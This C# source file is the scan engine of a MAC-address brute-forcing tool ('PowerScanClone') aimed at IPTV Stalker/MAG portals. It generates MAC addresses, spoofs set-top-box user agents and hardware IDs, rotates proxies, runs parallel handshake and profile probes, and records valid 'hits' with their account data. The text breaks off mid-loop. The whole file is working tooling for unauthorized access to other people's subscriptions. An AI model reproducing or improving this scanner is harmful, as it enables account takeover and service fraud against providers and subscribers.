// ScanEngine.cs
// Complete ScanEngine with:
// - Channel-based MAC queue (central producer + consumers)
// - Background writers (DB + file) integration (expects BackgroundServices.cs present)
// - StatusBroadcaster usage
// - MetricsService exposure (http://localhost:9191/metrics)
// - Parallel-per-MAC probing via ProbeHelpers.FirstSuccessfulTaggedAsync
// - Variant1 (.loli) integrated as a *fallback on failures* (controlled via Semaphore + negative cache)
// - Proper StopAsync implementation that completes the channel, cancels producer & workers,
//   clears dedup and resets pending counters so no MACs "run after stop"
//
// NOTE: This file expects certain external types to exist in your project:
// ScanConfig, ScanResult, BackgroundDbWriter, BackgroundFileWriter, StatusBroadcaster,
// MetricsService, Database, PortalClient, PortalHelpers, LegacyPortalVariant1,
// HitWriter, HitValidator, GenresMergeStrategy, Detector, Variant1Result, etc.
// The file is intentionally self-contained otherwise (all helper code included).

using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Channels;
using System.Threading.Tasks;
using System.Globalization;

namespace PowerScanClone
{
    public class ScanEngine : IDisposable
    {
        public event EventHandler<ScanResult>? OnResult;
        public event EventHandler<string>? OnStatus;

        // Event to notify UI when the engine has detected the real scan-type (endpoint)
        public event EventHandler<string>? OnScanTypeDetected;

        private static readonly string[] HwCandidates = new[] { "61270f148c0f99bf2bb9174252ee989084005aa7", "62", "218", "" };
        private static readonly string[] XUserAgentCandidates = new[] {
            "Model: MAG270; Link: WiFi",
            "Model: MAG200; Link: Ethernet",
            "Model: MAG254; Link: WiFi"
        };

        private readonly object _dbLock = new object();
        private static readonly HttpClient _diagnosticHttpClient;

        // Background services
        private BackgroundDbWriter? _bgDbWriter;
        private BackgroundFileWriter? _bgFileWriter;
        private StatusBroadcaster? _statusBroadcaster;

        // Shared HttpClient for miscellaneous short requests / diagnostics (not for PortalClient which uses worker handlers)
        private readonly HttpClient _http;

        // Metrics & pending macs counter (accurate)
        private MetricsService? _metricsService;
        private long _processedCountAll = 0;
        private long _totalLatencyTicks = 0; // aggregate ticks for average latency
        private long _pendingMacs = 0; // accurate pending macs counter (atomic)

        // Variant1 controls (used to limit Variant1 calls to only on failures)
        private SemaphoreSlim _variant1Semaphore = new SemaphoreSlim(2);
        private readonly ConcurrentDictionary<string, DateTime> _variant1NegCache = new ConcurrentDictionary<string, DateTime>(StringComparer.OrdinalIgnoreCase);

        // Dedup storage moved to a field so we can clear on stop/restart
        private RecentSet _recentMacs = new RecentSet(20000);

        // Channel + producer/worker bookkeeping so StopAsync can reliably stop and clear state
        private Channel<string>? _macChannel;
        private CancellationTokenSource? _producerCts;
        private Task? _producerTask;
        private List<Task>? _workerTasks;

        // ephemeral cancellation tokens tracked for StopAsync / per-run
        private CancellationTokenSource? _currentRunCts;
        private Task? _currentRunTask;

        // Optional progress handler for internal log
        private Action<string>? _progress;

        static ScanEngine()
        {
            try { ServicePointManager.DefaultConnectionLimit = Math.Max(ServicePointManager.DefaultConnectionLimit, 200); }
            catch { }
            _diagnosticHttpClient = new HttpClient { Timeout = TimeSpan.FromSeconds(6) };
        }

        public ScanEngine()
        {
            // Shared client for non-PortalClient short requests
            _http = new HttpClient(new HttpClientHandler { AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate })
            {
                Timeout = TimeSpan.FromSeconds(10)
            };
        }

        public void SetProgressHandler(Action<string> handler) => _progress = handler;

        private void LogError(string ctx, Exception ex)
        {
            try { SafeRaiseStatus($"[ERR] {ctx}: {ex.Message}", true); } catch { }
        }

        private void Trace(string line)
        {
            try { _progress?.Invoke(line); } catch { }
        }

        // Public helper so UI / caller can clear dedup cache immediately (e.g. on stop or panel switch)
        public void ClearDedupCache()
        {
            try
            {
                _recentMacs?.Clear();
                SafeRaiseStatus("Dedup cache cleared.");
            }
            catch { }
        }

        // StopAsync: cancels current run and clears dedup cache and channel so no more MACs are processed
        public async Task StopAsync()
        {
            try
            {
                _currentRunCts?.Cancel();
            }
            catch { }

            // Complete the mac channel writer so readers exit
            try
            {
                if (_macChannel != null)
                {
                    try { _macChannel.Writer.TryComplete(); } catch { }
                }
            }
            catch { }

            // Cancel the producer specifically
            try
            {
                _producerCts?.Cancel();
            }
            catch { }

            // Wait for producer task to finish (with small timeout)
            try
            {
                if (_producerTask != null)
                {
                    await Task.WhenAny(_producerTask).ConfigureAwait(false);
                }
            }
            catch { }

            // Wait for worker tasks to finish (they should exit when channel completes or token cancelled)
            try
            {
                if (_workerTasks != null && _workerTasks.Count > 0)
                {
                    await Task.WhenAll(_workerTasks.ToArray()).ConfigureAwait(false);
                }
            }
            catch { }

            // Ensure the main run task finishes
            try
            {
                if (_currentRunTask != null)
                {
                    await Task.WhenAny(_currentRunTask).ConfigureAwait(false);
                }
            }
            catch { }

            // Reset tracking fields
            try
            {
                _macChannel = null;
                try { _producerCts?.Dispose(); } catch { }
                _producerCts = null;
                _producerTask = null;
                _workerTasks = null;
            }
            catch { }

            // Clear dedup and reset pending counters
            try
            {
                _recentMacs?.Clear();
                Interlocked.Exchange(ref _pendingMacs, 0);
                SafeRaiseStatus("Scan stopped and dedup/pending reset.");
            }
            catch { }
        }

        // Primary StartAsync. Exposes full scan lifecycle.
        // This StartAsync creates its own internal CTS so StopAsync can cancel it.
        public Task StartAsync(ScanConfig config, CancellationToken externalCt)
        {
            // run guarded in a dedicated CTS so StopAsync can cancel without touching external token
            _currentRunCts = CancellationTokenSource.CreateLinkedTokenSource(externalCt);
            _currentRunTask = StartInternalAsync(config, _currentRunCts.Token);
            return _currentRunTask;
        }

        private async Task StartInternalAsync(ScanConfig config, CancellationToken ct)
        {
            if (config == null) throw new ArgumentNullException(nameof(config));
            if (string.IsNullOrWhiteSpace(config.PanelUrl))
            {
                SafeRaiseStatus("PanelUrl ist leer. Abbruch.", true);
                return;
            }

            // Ensure dedup is fresh when starting a new scan (prevents leftover MACs from prior runs)
            try
            {
                _recentMacs = new RecentSet(20000);
            }
            catch { _recentMacs = new RecentSet(20000); }

            config.PanelUrl = config.PanelUrl.TrimEnd('/');
            SafeRaiseStatus($"Initializing scan... Panel={config.PanelUrl} ScanType={config.ScanType} Bots={config.Bots} MacMode={config.MacMode}");

            // Initialize background services early so hot-path can use them
            try
            {
                try
                {
                    _bgDbWriter = new BackgroundDbWriter("results.db", batchSize: 16, flushInterval: TimeSpan.FromSeconds(1));
                }
                catch
                {
                    _bgDbWriter = null;
                }

                try
                {
                    _bgFileWriter = new BackgroundFileWriter();
                }
                catch
                {
                    _bgFileWriter = null;
                }

                try
                {
                    _statusBroadcaster = new StatusBroadcaster();
                    _statusBroadcaster.ProgrammaticStatusHandler = s =>
                    {
                        try
                        {
                            var handler = OnStatus;
                            if (handler == null) return;
                            handler.Invoke(this, s);
                        }
                        catch { }
                    };
                }
                catch
                {
                    _statusBroadcaster = null;
                }
            }
            catch { /* don't fail startup if background services can't be created */ }

            // Load UA headers from local file next to EXE (best-effort)
            try
            {
                var defaultPath = Path.Combine(AppContext.BaseDirectory ?? ".", "user-agents.json");
                if (File.Exists(defaultPath))
                {
                    try
                    {
                        var txt = File.ReadAllText(defaultPath);
                        if (!string.IsNullOrWhiteSpace(txt))
                        {
                            // keep for potential future use
                        }
                    }
                    catch { }
                }
            }
            catch { }

            string effectiveScanType = config.ScanType ?? "portal.php";
            bool userRequestedAuto = string.Equals(config.ScanType, "Auto", StringComparison.OrdinalIgnoreCase)
                                     || string.Equals(config.ScanType, "Auto-Scan", StringComparison.OrdinalIgnoreCase)
                                     || string.IsNullOrWhiteSpace(config.ScanType);

            bool usePerWorkerFixedEndpoints = userRequestedAuto;

            string detected = string.Empty;
            if (userRequestedAuto)
            {
                SafeRaiseStatus("Detecting scan type (Auto)...");
                try
                {
                    using var detectCts = CancellationTokenSource.CreateLinkedTokenSource(ct);
                    detectCts.CancelAfter(TimeSpan.FromSeconds(8));
                    var d = await Detector.DetectAsync(config.PanelUrl, detectCts.Token).ConfigureAwait(false);
                    detected = !string.IsNullOrWhiteSpace(d) ? d : "";
                }
                catch { detected = ""; }

                try
                {
                    var preferred = new List<string> { "portal.php", "server/load.php" };
                    PortalClient.SetAutoScanEndpoints(preferred);
                    SafeRaiseStatus($"Auto-scan endpoints set (priority): {string.Join(", ", preferred)}");
                }
                catch { }

                effectiveScanType = "Auto-Scan";

                try
                {
                    var handler = OnScanTypeDetected;
                    if (handler != null)
                    {
                        _ = Task.Run(() =>
                        {
                            try { handler.Invoke(this, "Auto-Scan"); } catch { }
                        });
                    }
                }
                catch { }
            }
            else
            {
                effectiveScanType = config.ScanType ?? "portal.php";
            }

            try { HitWriter.CurrentScanType = effectiveScanType; } catch { }

            // Proxy support
            var (proxyPool, singleProxy) = await BuildProxyPoolAsync(config, ct).ConfigureAwait(false);
            if (!string.IsNullOrWhiteSpace(singleProxy))
                SafeRaiseStatus($"Proxy (single) aktiv: {MaskProxy(singleProxy)}");
            else if (proxyPool.Count > 0)
                SafeRaiseStatus($"Proxy-Liste aktiv: {proxyPool.Count} Einträge (Round-Robin je Worker)");

            var macGen = new MacGenerator();

            // --- CHANNEL-BASED MAC QUEUE (now a field) ---
            _macChannel = Channel.CreateUnbounded<string>(new UnboundedChannelOptions { SingleReader = false, SingleWriter = false });

            var macMode = (config.MacMode ?? "Random Full").Trim();
            var macModeNorm = macMode.ToLowerInvariant();
            var selectedPrefix = config.SelectedPrefix;
            var customPrefixes = (config.CustomPrefixes ?? new List<string>()).Where(s => !string.IsNullOrWhiteSpace(s)).Select(s => s.Trim()).ToArray();
            var macList = (config.MacList ?? new List<string>()).Where(s => !string.IsNullOrWhiteSpace(s)).Select(s => s.Trim()).ToArray();
            var rnd = new Random();

            // Helper to enqueue MACs (uses field channel)
            async Task EnqueueMacAsync(string m, CancellationToken token)
            {
                try
                {
                    var ch = _macChannel;
                    if (ch == null) return;
                    if (!ch.Writer.TryWrite(m))
                    {
                        await ch.Writer.WriteAsync(m, token).ConfigureAwait(false);
                    }
                    Interlocked.Increment(ref _pendingMacs);
                }
                catch { /* best-effort */ }
            }

            void EnqueueMacSync(string m)
            {
                try
                {
                    var ch = _macChannel;
                    if (ch == null) return;
                    if (ch.Writer.TryWrite(m))
                        Interlocked.Increment(ref _pendingMacs);
                }
                catch { }
            }

            // Preload MACs
            if (macModeNorm == "from mac list" || macModeNorm == "mac list" || (macList.Length > 0 && macModeNorm == "from mac list"))
            {
                if (macList.Length > 0)
                {
                    foreach (var m in macList) EnqueueMacSync(m);
                    SafeRaiseStatus($"Preloaded {macList.Length} MACs from MacList");
                }
                else
                {
                    SafeRaiseStatus("[WARN] MacMode=From MAC List selected but no mac list provided; falling back to Random Full for preload.");
                    for (int i = 0; i < Math.Max(200, config.Bots * 20); i++) EnqueueMacSync(macGen.GenerateRandomMac());
                }
            }
            else if (macModeNorm == "prefix oui" || macModeNorm == "prefix_oui" || macModeNorm == "prefix")
            {
                var prefixes = new List<string>();
                if (!string.IsNullOrWhiteSpace(selectedPrefix)) prefixes.Add(selectedPrefix);
                if (customPrefixes.Length > 0) prefixes.AddRange(customPrefixes);
                if (prefixes.Count == 0)
                {
                    SafeRaiseStatus("[WARN] MacMode=Prefix OUI selected but no prefix provided; falling back to Random Full for preload.");
                    for (int i = 0; i < Math.Max(200, config.Bots * 20); i++) EnqueueMacSync(macGen.GenerateRandomMac());
                }
                else
                {
                    for (int i = 0; i < Math.Max(200, config.Bots * 20); i++)
                    {
                        var pfx = prefixes[rnd.Next(prefixes.Count)];
                        EnqueueMacSync(macGen.GenerateFromPrefix(pfx));
                    }
                    SafeRaiseStatus($"Preloaded {Interlocked.Read(ref _pendingMacs)} MACs using prefixes (Prefix OUI/Custom).");
                }
            }
            else if (macModeNorm == "custom prefixes" || macModeNorm == "custom_prefixes")
            {
                if (customPrefixes.Length > 0)
                {
                    for (int i = 0; i < Math.Max(200, config.Bots * 20); i++)
                    {
                        var pfx = customPrefixes[rnd.Next(customPrefixes.Length)];
                        EnqueueMacSync(macGen.GenerateFromPrefix(pfx));
                    }
                    SafeRaiseStatus($"Preloaded {Interlocked.Read(ref _pendingMacs)} MACs using Custom Prefixes.");
                }
                else
                {
                    SafeRaiseStatus("[WARN] MacMode=Custom Prefixes selected but no prefixes provided; falling back to Random Full for preload.");
                    for (int i = 0; i < Math.Max(200, config.Bots * 20); i++) EnqueueMacSync(macGen.GenerateRandomMac());
                }
            }
            else
            {
                for (int i = 0; i < Math.Max(200, config.Bots * 20); i++) EnqueueMacSync(macGen.GenerateRandomMac());
                SafeRaiseStatus($"Preloaded {Interlocked.Read(ref _pendingMacs)} random MACs (Random Full).");
            }

            if (Interlocked.Read(ref _pendingMacs) == 0)
            {
                for (int i = 0; i < Math.Max(200, config.Bots * 20); i++) EnqueueMacSync(macGen.GenerateRandomMac());
            }

            // Start centralized Producer task to refill when pending falls below threshold
            _producerCts = CancellationTokenSource.CreateLinkedTokenSource(ct);
            _producerTask = Task.Run(async () =>
            {
                try
                {
                    var refillLowWater = Math.Max(50, config.Bots * 5);
                    var refillCount = 50;
                    var localRnd = new Random();
                    while (!_producerCts!.Token.IsCancellationRequested)
                    {
                        var pending = Interlocked.Read(ref _pendingMacs);
                        if (pending < refillLowWater)
                        {
                            SafeRaiseStatus($"Producer: pending={pending} < {refillLowWater}, refilling {refillCount} items...");
                            int added = 0;
                            for (int i = 0; i < refillCount && !_producerCts.Token.IsCancellationRequested; i++)
                            {
                                string generated;
                                if (macModeNorm == "from mac list" || macModeNorm == "mac list")
                                {
                                    generated = macList.Length > 0 ? macList[localRnd.Next(macList.Length)] : macGen.GenerateRandomMac();
                                }
                                else if (macModeNorm == "prefix oui" || macModeNorm == "prefix_oui" || macModeNorm == "prefix")
                                {
                                    var prefixes = new List<string>();
                                    if (!string.IsNullOrWhiteSpace(selectedPrefix)) prefixes.Add(selectedPrefix);
                                    if (customPrefixes.Length > 0) prefixes.AddRange(customPrefixes);
                                    generated = prefixes.Count == 0 ? macGen.GenerateRandomMac() : macGen.GenerateFromPrefix(prefixes[localRnd.Next(prefixes.Count)]);
                                }
                                else if (macModeNorm == "custom prefixes" || macModeNorm == "custom_prefixes")
                                {
                                    generated = customPrefixes.Length > 0 ? macGen.GenerateFromPrefix(customPrefixes[localRnd.Next(customPrefixes.Length)]) : macGen.GenerateRandomMac();
                                }
                                else
                                {
                                    generated = macGen.GenerateRandomMac();
                                }

                                try { await EnqueueMacAsync(generated, _producerCts.Token).ConfigureAwait(false); added++; } catch { break; }
                            }
                            SafeRaiseStatus($"Producer: refill complete, added={added}, newPending={Interlocked.Read(ref _pendingMacs)}");
                        }
                        try { await Task.Delay(200, _producerCts.Token).ConfigureAwait(false); } catch { break; }
                    }
                }
                catch (OperationCanceledException) { }
            }, _producerCts.Token);

            var db = new Database("results.db");
            _workerTasks = new List<Task>();
            var workerCount = Math.Max(1, config.Bots);

            SafeRaiseStatus($"Launching {workerCount} worker(s)...");
            var startupStagger = TimeSpan.FromMilliseconds(120);

            int perCallTimeoutMs = config.RequestTimeoutMs > 0 ? config.RequestTimeoutMs : 7000;

            // Start Metrics service (reports pending macs accurately)
            try
            {
                _metricsService = new MetricsService(() =>
                {
                    return new
                    {
                        PendingMacs = Interlocked.Read(ref _pendingMacs),
                        ProcessedAll = Interlocked.Read(ref _processedCountAll),
                        AvgLatencyMs = Interlocked.Read(ref _processedCountAll) == 0 ? 0.0 :
                            TimeSpan.FromTicks(Interlocked.Read(ref _totalLatencyTicks)).TotalMilliseconds / Interlocked.Read(ref _processedCountAll),
                        BackgroundDbPending = _bgDbWriter?.PendingCount ?? 0,
                        BackgroundFilePending = _bgFileWriter?.PendingCount ?? 0,
                        BackgroundDbProcessed = _bgDbWriter?.ProcessedCount ?? 0,
                        BackgroundFileProcessed = _bgFileWriter?.ProcessedCount ?? 0,
                        TimestampUtc = DateTime.UtcNow
                    };
                }, port: 9191);
            }
            catch
            {
                _metricsService = null;
            }

            // Enable Variant1 (.loli) behavior if configured in ScanConfig
            bool enableVariant1 = GetBoolConfig(config, "EnableVariant1");

            // Read variant1 tuning values and (re)initialize semaphore accordingly
            int variant1Concurrency = GetIntConfig(config, "Variant1Concurrency", 2);
            int variant1NegCacheSeconds = GetIntConfig(config, "Variant1NegCacheSeconds", 600); // 10min default
            try
            {
                try { _variant1Semaphore.Dispose(); } catch { }
                _variant1Semaphore = new SemaphoreSlim(Math.Max(1, variant1Concurrency));
            }
            catch { /* ignore */ }

            for (int w = 0; w < workerCount; w++)
            {
                int workerId = w + 1;

                // Proxy per worker
                string? workerProxy = null;
                if (proxyPool.Count > 0)
                    workerProxy = proxyPool[(workerId - 1) % proxyPool.Count];
                else if (!string.IsNullOrWhiteSpace(singleProxy))
                    workerProxy = singleProxy;

                // capture variables for closure
                var thisWorkerProxy = workerProxy;
                var thisEndpointChoice = usePerWorkerFixedEndpoints;

                var workerTask = Task.Run(async () =>
                {
                    int consecutiveTimeouts = 0;
                    const int maxConsecutiveTimeoutsBeforeDiagnostic = 6;
                    int adaptiveDelayMs = 0;

                    PortalClient? portalClient = null;
                    try
                    {
                        string endpointForThisWorker;
                        if (thisEndpointChoice)
                        {
                            endpointForThisWorker = ((workerId & 1) == 1) ? "portal.php" : "server/load.php";
                        }
                        else
                        {
                            endpointForThisWorker = effectiveScanType;
                        }

                        // Handler per worker
                        var workerHandler = CreateHandlerWithProxy(config, thisWorkerProxy);

                        try { portalClient = new PortalClient(config.PanelUrl, endpointForThisWorker, workerHandler); }
                        catch (Exception exPortalInit)
                        {
                            LogError("PortalClient.ctor", exPortalInit);
                            SafeRaiseStatus($"Worker {workerId}: failed to create PortalClient - stopping worker.", true);
                            return;
                        }

                        try { HitWriter.CurrentScanType = endpointForThisWorker; } catch { }

                        try
                        {
                            int perReqSec = Math.Max(2, (int)Math.Ceiling((config.RequestTimeoutMs > 0 ? config.RequestTimeoutMs : perCallTimeoutMs) / 1000.0));
                            portalClient.SetPerRequestTimeout(perReqSec);

                            portalClient.SetMaxRetries(Math.Max(0, config.MaxRetries));

                            portalClient.SetAutoScanConcurrency(Math.Max(1, (config.GenresFetchParallelism > 0 ? config.GenresFetchParallelism : 2)));

                            try { portalClient.SetAuthCacheTtl(Math.Max(30, Math.Min(600, perReqSec * 3))); } catch { }

                            if (GetBoolConfig(config, "DebugDisableNegativeCache"))
                            {
                                try { portalClient.SetNegativeCacheTtl(TimeSpan.Zero); } catch { }
                            }
                        }
                        catch (Exception exCfg) { LogError("PortalClient.ConfigApply", exCfg); }

                        var proxyInfo = string.IsNullOrWhiteSpace(thisWorkerProxy) ? "none" : MaskProxy(thisWorkerProxy);
                        SafeRaiseStatus($"Worker {workerId} started (proxy={proxyInfo}, endpoint={endpointForThisWorker})");
                        try { await Task.Delay(startupStagger, ct).ConfigureAwait(false); } catch { }

                        var localRnd = new Random(Environment.TickCount ^ workerId);

                        string[] xuaOrder()
                        {
                            var list = (config.AdditionalXUserAgents ?? new List<string>()).Where(s => !string.IsNullOrWhiteSpace(s)).Select(s => s!.Trim()).ToList();
                            foreach (var d in XUserAgentCandidates) if (!list.Contains(d)) list.Add(d);
                            return list.OrderBy(_ => localRnd.Next()).ToArray();
                        }
                        string[] hwOrder() => HwCandidates.OrderBy(_ => localRnd.Next()).ToArray();

                        long processed = 0;

                        int handshakeParallelism = GetIntConfig(config, "HandshakeParallelism", 2);
                        int hwParallelism = GetIntConfig(config, "HwParallelism", 3);
                        int perMacTimeoutMs = GetIntConfig(config, "PerMacTimeoutMs", Math.Max(8000, perCallTimeoutMs * 2)); // overall per-MAC budget
                        if (handshakeParallelism < 1) handshakeParallelism = 1;
                        if (hwParallelism < 1) hwParallelism = 1;
                        var overallPerMacTimeout = TimeSpan.FromMilliseconds(Math.Max(1000, perMacTimeoutMs));

                        var ch = _macChannel;
                        if (ch == null) return;

                        while (!ct.IsCancellationRequested)
                        {
                            DateTime startTime = DateTime.UtcNow;

                            try
                            {
                                if (adaptiveDelayMs > 0)
                                {
                                    try { await Task.Delay(adaptiveDelayMs, ct).ConfigureAwait(false); } catch { }
                                }

                                string mac;
                                try
                                {
                                    mac = await ch.Reader.ReadAsync(ct).ConfigureAwait(false);
                                    Interlocked.Decrement(ref _pendingMacs); // accurate decrement on consume
                                }
                                catch (OperationCanceledException) { break; }
                                catch (ChannelClosedException) { break; }

                                var macForCookie = NormalizeMacString(mac);
                                if (string.IsNullOrWhiteSpace(macForCookie)) continue;

                                // Use field-based recent set so it can be cleared on stop/restart
                                if (!_recentMacs.AddIfNew(macForCookie)) continue;

                                SafeRaiseStatus($"Worker {workerId} scanning {macForCookie}");

                                string adid;
                                using (var md5 = MD5.Create())
                                {
                                    adid = BitConverter.ToString(md5.ComputeHash(Encoding.UTF8.GetBytes(macForCookie))).Replace("-", "").ToUpperInvariant();
                                }

                                TimeSpan perCallTimeout = TimeSpan.FromMilliseconds(perCallTimeoutMs);

                                string? handshakeText = null;
                                string? token = null;
                                string? prehash = null;
                                string profileText = "";
                                bool profileSuccess = false;
                                string? lastXuaUsed = null;

                                // -----------------------
                                // Parallelized Handshake:
                                // -----------------------
                                try
                                {
                                    var xuaCandidates = xuaOrder();
                                    var handshakeFactories = xuaCandidates.Select(xua => new Func<CancellationToken, Task<(string? text, string tag)>>(async (innerCt) =>
                                    {
                                        try
                                        {
                                            using var perAttemptCts = CancellationTokenSource.CreateLinkedTokenSource(innerCt);
                                            if (perCallTimeout.TotalMilliseconds > 0) perAttemptCts.CancelAfter(perCallTimeout);
                                            SafeRaiseStatus($"Worker {workerId} handshake (UA={xua}) for {macForCookie}");
                                            var txt = await portalClient.HandshakeAsync(macForCookie, adid, null, xua, perAttemptCts.Token).ConfigureAwait(false);
                                            return (txt, xua);
                                        }
                                        catch (OperationCanceledException) { return (null, xua); }
                                        catch (Exception exH)
                                        {
                                            LogError("HandshakeParallel", exH);
                                            return (null, xua);
                                        }
                                    })).ToArray();

                                    var hsRes = await ProbeHelpers.FirstSuccessfulTaggedAsync(
                                        handshakeFactories,
                                        maxConcurrency: Math.Min(handshakeParallelism, Math.Max(1, xuaCandidates.Length)),
                                        overallTimeout: overallPerMacTimeout,
                                        considerSuccess: tuple => !string.IsNullOrWhiteSpace(tuple.text) && !PortalClient.IsEmptyJsArray(tuple.text ?? ""),
                                        ct).ConfigureAwait(false);

                                    if (hsRes != null && !string.IsNullOrWhiteSpace(hsRes.Value.text))
                                    {
                                        handshakeText = hsRes.Value.text;
                                        lastXuaUsed = hsRes.Value.tag;
                                        consecutiveTimeouts = 0;
                                        adaptiveDelayMs = 0;
                                    }
                                    else
                                    {
                                        // no handshake success within budget
                                        handshakeText = null;
                                        consecutiveTimeouts++;
                                        adaptiveDelayMs = Math.Min(1200, adaptiveDelayMs + 200);
                                        SafeRaiseStatus($"[TIMEOUT] Worker {workerId} handshake (parallel) for {macForCookie} - no success", true);
                                    }
                                }
                                catch (OperationCanceledException)
                                {
                                    handshakeText = null;
                                    consecutiveTimeouts++;
                                    adaptiveDelayMs = Math.Min(1200, adaptiveDelayMs + 200);
                                    SafeRaiseStatus($"[TIMEOUT] Worker {workerId} handshake (parallel) for {macForCookie}", true);
                                }
                                catch (Exception exHPar)
                                {
                                    handshakeText = null;
                                    LogError("HandshakeParallelTop", exHPar);
                                }

                                if (string.IsNullOrWhiteSpace(handshakeText))
                                {
                                    try { await Task.Delay(100, ct).ConfigureAwait(false); } catch { }

                                    // Only run Variant1 as a fallback on failures (controlled by semaphore & negative cache)
                                    if (enableVariant1)
                                    {
                                        try
                                        {
                                            var v1 = await RunVariant1WithControlsAsync(config, config.PanelUrl, macForCookie, thisWorkerProxy, perCallTimeoutMs, variant1NegCacheSeconds, ct).ConfigureAwait(false);
                                            if (v1 != null && v1.Success)
                                            {
                                                if (!string.IsNullOrWhiteSpace(v1.ProfileBody))
                                                {
                                                    profileText = v1.ProfileBody;
                                                    profileSuccess = true;
                                                }
                                                if (!string.IsNullOrWhiteSpace(v1.AccountBody) && (config.VerboseLogging || config.SaveRawAlways))
                                                {
                                                    if (_bgFileWriter != null) _bgFileWriter.TryEnqueue("account", macForCookie, v1.AccountBody);
                                                    else HitWriter.SaveRawResponse("account", macForCookie, v1.AccountBody);
                                                }
                                                if (!string.IsNullOrWhiteSpace(v1.GenresBody) && (config.VerboseLogging || config.SaveRawAlways))
                                                {
                                                    if (_bgFileWriter != null) _bgFileWriter.TryEnqueue("genres", macForCookie, v1.GenresBody);
                                                    else HitWriter.SaveRawResponse("genres", macForCookie, v1.GenresBody);
                                                }
                                                token = token ?? v1.Token;
                                                prehash = prehash ?? v1.Prehash;
                                            }
                                        }
                                        catch (Exception ex) { LogError("Variant1.Run", ex); }
                                    }

                                    // continue to next mac if still nothing useful
                                    if (string.IsNullOrWhiteSpace(profileText)) continue;
                                }

                                // Use PortalClient extraction but fall back to PortalHelpers for robustness
                                token = PortalClient.ExtractToken(handshakeText ?? "") ?? PortalHelpers.ExtractTokenFromHandshake(handshakeText ?? "");
                                prehash = PortalClient.ExtractPrehash(handshakeText ?? "") ?? PortalHelpers.ExtractPrehashFromHandshake(handshakeText ?? "");

                                // -----------------------
                                // Parallelized HW GetProfile:
                                // -----------------------
                                try
                                {
                                    var hwCandidates = hwOrder();
                                    var hwFactories = hwCandidates.Select(hw => new Func<CancellationToken, Task<(string? text, string tag)>>(async (innerCt) =>
                                    {
                                        try
                                        {
                                            using var perAttemptCts = CancellationTokenSource.CreateLinkedTokenSource(innerCt);
                                            if (perCallTimeout.TotalMilliseconds > 0) perAttemptCts.CancelAfter(perCallTimeout);
                                            SafeRaiseStatus($"Worker {workerId} get_profile (hw={hw}) for {macForCookie}");
                                            var prof = await portalClient.GetProfileWithParamsAsync(macForCookie, adid, token ?? "", PortalClient.ComputeSnCut13(macForCookie), hw, prehash, lastXuaUsed, perAttemptCts.Token).ConfigureAwait(false);
                                            return (prof, hw);
                                        }
                                        catch (OperationCanceledException) { return (null, hw); }
                                        catch (Exception exP)
                                        {
                                            LogError("GetProfileParallel", exP);
                                            return (null, hw);
                                        }
                                    })).ToArray();

                                    var profRes = await ProbeHelpers.FirstSuccessfulTaggedAsync(
                                        hwFactories,
                                        maxConcurrency: Math.Min(hwParallelism, Math.Max(1, hwCandidates.Length)),
                                        overallTimeout: overallPerMacTimeout,
                                        considerSuccess: tuple => !PortalClient.IsEmptyJsArray(tuple.text ?? "") && !string.IsNullOrWhiteSpace(tuple.text),
                                        ct).ConfigureAwait(false);

                                    if (profRes != null && !string.IsNullOrWhiteSpace(profRes.Value.text))
                                    {
                                        profileText = profRes.Value.text;
                                        profileSuccess = true;
                                        consecutiveTimeouts = 0;
                                        adaptiveDelayMs = 0;
                                    }
                                    else
                                    {
                                        profileText = "";
                                        profileSuccess = false;
                                        // leave for prehash-handshake fallback below
                                    }
                                }
                                catch (OperationCanceledException)
                                {
                                    profileText = "";
                                    profileSuccess = false;
                                    consecutiveTimeouts++;
                                    adaptiveDelayMs = Math.Min(1200, adaptiveDelayMs + 150);
                                    SafeRaiseStatus($"[TIMEOUT] Worker {workerId} GetProfile (parallel) for {macForCookie}", true);
                                }
                                catch (Exception exGP) { LogError("GetProfileParallelTop", exGP); }

                                if (!profileSuccess && !string.IsNullOrEmpty(prehash))
                                {
                                    // Try handshake again with prehash, parallel HW attempts after
                                    try
                                    {
                                        using var perCallCts = CancellationTokenSource.CreateLinkedTokenSource(ct);
                                        perCallCts.CancelAfter(perCallTimeout);
                                        handshakeText = await portalClient.HandshakeAsync(macForCookie, adid, prehash, lastXuaUsed, perCallCts.Token).ConfigureAwait(false);
                                        token = PortalClient.ExtractToken(handshakeText ?? "") ?? PortalHelpers.ExtractTokenFromHandshake(handshakeText ?? "");
                                        consecutiveTimeouts = 0;
                                        adaptiveDelayMs = 0;
                                    }
                                    catch (OperationCanceledException)
                                    {
                                        consecutiveTimeouts++;
                                        adaptiveDelayMs = Math.Min(1200, adaptiveDelayMs + 150);
                                        SafeRaiseStatus($"[TIMEOUT] Worker {workerId} handshake(prehash) for {macForCookie}", true);
                                        handshakeText = null;
                                    }
                                    catch (Exception exPH)
                                    {
                                        consecutiveTimeouts++;
                                        adaptiveDelayMs = Math.Min(1200, adaptiveDelayMs + 100);
                                        LogError("Handshake with prehash", exPH);
                                        handshakeText = null;
                                    }

                                    if (!string.IsNullOrWhiteSpace(handshakeText))
                                    {
                                        try
                                        {
                                            var hwCandidates2 = hwOrder();
                                            var hwFactories2 = hwCandidates2.Select(hw => new Func<CancellationToken, Task<(string? text, string tag)>>(async (innerCt) =>
                                            {
                                                try
                                                {
                                                    using var perAttemptCts = CancellationTokenSource.CreateLinkedTokenSource(innerCt);
                                                    if (perCallTimeout.TotalMilliseconds > 0) perAttemptCts.CancelAfter(perCallTimeout);
                                                    var gotProfile2 = await portalClient.GetProfileWithParamsAsync(macForCookie, adid, token ?? "", PortalClient.ComputeSnCut13(macForCookie), hw, prehash, lastXuaUsed, perAttemptCts.Token).ConfigureAwait(false);
                                                    return (gotProfile2, hw);
                                                }
                                                catch (OperationCanceledException) { return (null, hw); }
                                                catch (Exception exPP)
                                                {
                                                    LogError("GetProfileWithParams (prehash) Parallel", exPP);
                                                    return (null, hw);
                                                }
                                            })).ToArray();

                                            var profRes2 = await ProbeHelpers.FirstSuccessfulTaggedAsync(
                                                hwFactories2,
                                                maxConcurrency: Math.Min(hwParallelism, Math.Max(1, hwCandidates2.Length)),
                                                overallTimeout: overallPerMacTimeout,
                                                considerSuccess: tuple => !PortalClient.IsEmptyJsArray(tuple.text ?? "") && !string.IsNullOrWhiteSpace(tuple.text),
                                                ct).ConfigureAwait(false);

